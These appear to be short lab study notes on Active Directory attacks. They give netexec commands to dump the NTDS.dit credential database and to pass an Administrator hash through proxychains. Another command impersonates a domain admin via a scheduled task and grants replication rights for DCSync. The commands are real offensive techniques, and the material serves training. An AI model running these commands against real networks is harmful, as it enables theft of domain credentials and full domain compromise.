**DCSync**
![](assets/Pasted%20image%2020260717082704.png)

dump NTDS.dit with netexec
`nxc smb <IP> -u <user> -p <pass> --ntds`
- dump a single user
`--ntds --user <user>`
- include Kerberos keys
`--ntds --kerberos-keys`
- include password history
`--ntds-history`


**Learning objective 13**
![](assets/Pasted%20image%2020260717084241.png)

Impersonate DA
`proxychains -q nxc smb <IPP> -u Administrator -H <hash> --local-auth -M schtask_as -o USER=adm_david.miller SILENTCOMMAND=True CMD='powershell.exe "Invoke-Command -ComputerName Auto-DC01 -ScriptBlock (ping 172.16.100.1)"`

Add Replication Rights
`proxychains -q nxc smb <IP> -u <Administrator> -H <hash> --local-auth -M schtask_as -o USER=adm_david.miller SILENTCOMMAND=True CMD=<command>`
- check lab manual for the command
![](assets/Pasted%20image%2020260717084602.png)

Dump NTDS to get DA hash
`proxychains -q nxc smb <IP> -u <user> -p <pass> --ntds`
